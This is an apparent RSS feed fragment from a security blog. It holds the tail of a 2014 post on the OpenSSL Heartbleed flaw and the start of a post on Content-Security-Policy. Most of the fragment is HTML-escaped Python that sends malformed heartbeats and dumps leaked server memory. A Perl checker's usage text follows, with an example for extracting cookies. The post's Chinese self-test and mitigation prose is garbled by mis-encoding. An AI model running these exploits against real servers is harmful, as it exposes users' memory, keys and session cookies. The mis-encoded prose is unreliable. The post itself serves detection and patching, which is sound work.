    &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;gt;BHH&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Unexpected EOF receiving record payload - server closed connection&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39; ... received message: type = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, ver = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%04x&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, length = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;No heartbeat response received, server likely not vulnerable&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Received heartbeat response:&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;WARNING: server returned more data than it should - server is vulnerable!&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Server processed malformed heartbeat, but did not return any extra data.&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Received alert:&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Server returned error, likely not vulnerable&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Connecting...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Sending Client Hello...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Waiting for Server Hello...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Server closed connection without sending Server Hello.&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# Look for server hello done message.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Sending heartbeat request...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;è‡ªæˆ‘æ¸¬è©¦å·¥å…· &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½¿ç”¨æ–¹æ³•ç›´æ¥åŸ·è¡Œã€Œperl check-ssl-heartbleed.pl mail.XXXXXX.gov.tw:443ã€ï¼Œå¯åœ¨ç¶²åŸŸåç¨±å¾ŒæŒ‡å®šç‰¹å®š SSL é€£æ¥åŸ ã€‚&lt;/p&gt;

&lt;p&gt;ä½¿ç”¨èªªæ˜ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;Check if server is vulnerable against heartbleet SSL attack (CVE-2014-0160)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;Usage: check-ssl-heartbleed.pl [ --starttls proto[:arg] ] [ --timeout T ] host:port&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  --starttls proto[:arg] - start plain and upgrade to SSL with&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;			   starttls protocol (imap,smtp,http,pop)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -T|--timeout T         - use timeout (default 5)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -H|--heartbeats N      - number of heartbeats (default 1)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -s|--show-data [L]     - show heartbeat response if vulnerable, optional&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;                           parameter L specifies number of bytes per line (16)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -R|--show-regex-data R - show data matching perl regex R. Option can be&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;                           used multiple times&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -q|--quiet             - don&amp;#39;t show anything, exit 1 if vulnerable&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -h|--help              - this screen&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;Examples:&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  # check direct www, imaps .. server&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl www.google.com:443&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl www.google.com:https&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl mail.google.com:imaps&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # try to get Cookies&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl -R &amp;#39;Cookie:.*&amp;#39; www.broken-site.com:443&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check webserver via proxy&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls http:www.google.com:443 proxy:8000&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check imap server, start with plain and upgrade&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls imap imap.gmx.net:143&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check pop server, start with plain and upgrade&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls pop pop.gmx.net:110&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # check smtp server, start with plain and upgrade&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls smtp smtp.gmail.com:587&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;æ‡‰å°æªæ–½&quot;&gt;æ‡‰å°æªæ–½&lt;/h3&gt;

&lt;p&gt;å¦‚æœç™¼ç¾è‡ªå·±çš„ä¼ºæœå™¨æœ‰é€™æ¨£çš„æ¼æ´ï¼Œè©²æ€éº¼è¾¦å‘¢ï¼Ÿ&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¢ºèªè‡ªå·±çš„ OpenSSL ç‰ˆæœ¬æ˜¯å¦åœ¨å—å®³ç¯„åœ&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ ssltest.py æª¢æ¸¬å·¥å…·æª¢æ¸¬æ˜¯å¦å«æœ‰æ¼æ´&lt;/li&gt;
  &lt;li&gt;æ›´æ–° OpenSSL è‡³ 1.0.1g æˆ– 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;é‡é–‹æ‰€æœ‰èˆ‡ OpenSSL å‡½å¼åº«ç›¸é—œä¹‹æœå‹™&lt;/li&gt;
  &lt;li&gt;é‡æ–°ç”¢ç”Ÿ SSL Private Key (å› ç‚º Private Key å¯èƒ½è—‰ç”±æ¼æ´å¤–æ´©)&lt;/li&gt;
  &lt;li&gt;å°‡ç¶²ç«™èˆŠæ†‘è­‰æ’¤éŠ·&lt;/li&gt;
  &lt;li&gt;æ¸…é™¤æ‰€æœ‰ç›®å‰ç¶²é ä¼ºæœå™¨ä¸Šçš„ Session ï¼ˆå› ç‚ºå¯èƒ½é­åˆ°ç«Šå–ï¼‰&lt;/li&gt;
  &lt;li&gt;å¿…è¦æ™‚æ›´æ›ç¶²ç«™å…§ä½¿ç”¨è€…å¯†ç¢¼ï¼Œæˆ–æ˜¯å¯†åˆ‡è¿½è¹¤ç¶²ç«™æ˜¯å¦æœ‰å¸³è™Ÿç›œç”¨çš„æƒ…æ³ç™¼ç”Ÿ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;è©³ç´°è¨è«–èˆ‡å»ºè­°å¯ä»¥åƒè€ƒ&lt;br /&gt;
Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&quot;&gt;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;èª°æœƒæ˜¯ç›®æ¨™å‘¢&quot;&gt;èª°æœƒæ˜¯ç›®æ¨™å‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;çœŸçš„æœƒæœ‰æ”»æ“Šè€…åˆ©ç”¨é€™æ¨£çš„æ”»æ“Šæ‰‹æ³•å—ï¼Ÿç›®å‰åœ¨&lt;a href=&quot;http://wooyun.org&quot;&gt;çƒé›² wooyun&lt;/a&gt;å¹³å°ä¸Šå·²ç¶“æ»¿æ»¿çš„è³‡å®‰ç ”ç©¶å“¡é–‹å§‹å›å ±ç¶²ç«™å«æœ‰ OpenSSL æ¼æ´ã€‚ä¹Ÿæœ‰é§­å®¢åœ¨å˜—è©¦æ’°å¯«æ›´æœ‰æ•ˆçš„æ”»æ“Šåˆ©ç”¨ç¨‹å¼ï¼Œæƒ³è¦è—‰æ­¤æŠŠå¹³å¸¸æ‰“ä¸ä¸‹ä¾†çš„ç¶²ç«™ä¸€èˆ‰æ”»é™·ã€‚&lt;/p&gt;

&lt;p&gt;æ€æ¨£çš„ç«™å°æœƒæ˜¯é‡é»ç›®æ¨™å‘¢ï¼Ÿå«æœ‰æœƒå“¡æ©Ÿåˆ¶çš„ç¶²ç«™ç‰¹åˆ¥å¦‚æ­¤ï¼Œä¾‹å¦‚ Web Mailã€ç¤¾ç¾¤ç¶²ç«™ç­‰ç­‰ã€‚å› æ­¤ä¸å°‘ä¼æ¥­è¦å¤šæ³¨æ„äº†ï¼Œä¾‹å¦‚å…¨ä¸–ç•Œæœ€å¤§çš„ç¤¾ç¾¤ç¶²ç«™ Facebookã€SlideShareã€å°ç£çŸ¥åé›»ä¿¡å…¬å¸ç¶²ç«™ã€ç¤¾äº¤å¹³å°ã€ç¶²è·¯éŠ€è¡Œã€NASï¼Œéƒ½æœƒåœ¨é€™æ³¢çš„æ”»æ“Šç¯„åœä¹‹å…§ã€‚å¦‚æœæ²’æœ‰å„˜é€Ÿä¿®å¾©ï¼Œç­‰åˆ°æ›´æœ‰æ•ˆçš„æ”»æ“Šç¨‹å¼å‡ºç¾ï¼Œå°±çœŸçš„ç­‰è‘—å¤±è¡€äº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å°çµ&quot;&gt;å°çµ&lt;/h3&gt;

&lt;p&gt;å°±é€£ OpenSSL é€™ç¨®æ­·å²æ‚ ä¹…è€Œä¸”é‡è¦çš„å‡½å¼åº«ï¼Œéƒ½å¯èƒ½çŠ¯é€™ç¨®åŸºæœ¬çš„ C èªè¨€ç¨‹å¼è¨­è¨ˆéŒ¯èª¤ï¼Œè€èˆŠçš„ç¨‹å¼ç¢¼ä¸€å®šæœ‰ä¸å°‘é™³å¹´éºæ¯’ï¼Œå¦‚æœæ²’æœ‰å¾¹åº•æ¸…æŸ¥ï¼Œé¡ä¼¼çš„å¿ƒè‡Ÿå™´è¡€äº‹ä»¶æœƒä¸æ–·ä¸Šæ¼”ã€‚å¤§å®¶å¿«é»æ­¢è¡€å§ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/</link>
                <guid>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160</guid>
                <pubDate>Wed, 09 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Content-Security-Policy - HTTP Headers çš„è³‡å®‰è­°é¡Œ (2)</title>
                <description>&lt;h3 id=&quot;content-security-policy&quot;&gt;Content-Security-Policy&lt;/h3&gt;

&lt;p&gt;é‚„è¨˜å¾—åœ¨ä¸Šä¸€ç¯‡ &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP headers çš„è³‡å®‰è­°é¡Œ (1)&lt;/a&gt; æ–‡ç« ä¸­ï¼Œæˆ‘å€‘æåˆ°äº†å¤šç¨®è³‡å®‰ç›¸é—œçš„ HTTP headers å—ï¼Ÿæ¥ä¸‹ä¾†çš„å¹¾ç¯‡æ–‡ç« æˆ‘å€‘æœƒä»‹ç´¹å¹¾å€‹å°ˆé–€å°ä»˜ XSS çš„ HTTP headersï¼Œé¦–å…ˆå°±ç”± Content-Security-Policy æ‰“é ­é™£ã€‚&lt;/p&gt;

